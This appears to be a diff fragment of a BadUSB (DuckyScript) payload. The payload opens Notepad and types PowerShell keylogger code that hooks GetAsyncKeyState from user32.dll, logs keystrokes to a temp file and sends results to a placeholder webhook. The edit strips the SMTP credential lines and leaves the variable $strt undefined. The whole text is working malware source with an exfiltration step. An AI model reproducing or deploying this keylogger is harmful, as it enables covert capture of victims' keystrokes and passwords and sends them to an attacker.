@@ -17,11 +17,9 @@ DELAY 500
 STRING notepad
 ENTER
 DELAY 2500
-STRING Do{$whuri = "WEBHOOK_HERE";$RunTime = 1;$TimesRun = 1;$getT = Get-Date;$Subj = "$env:COMPUTERNAME : log Results";$body = "$env:COMPUTERNAME : Results : $strt"
+STRING Do{$whuri = "WEBHOOK_HERE";$RunTime = 1;$TimesRun = 1;$getT = Get-Date
 ENTER
-STRING $SMTP = "smtp.outlook.com";$Prt = "587";$Creds = new-object Management.Automation.PSCredential $FromTo, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
-ENTER
-STRING $Attachment = $strt = Get-Date;$end = $strt.addminutes($RunTime);function Start-Key($Path="$env:temp\log.txt"){$sigs = @'
+STRING $end = $strt.addminutes($RunTime);function Start-Key($Path="$env:temp\log.txt"){$sigs = @'
 ENTER
 STRING [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode);
 ENTER
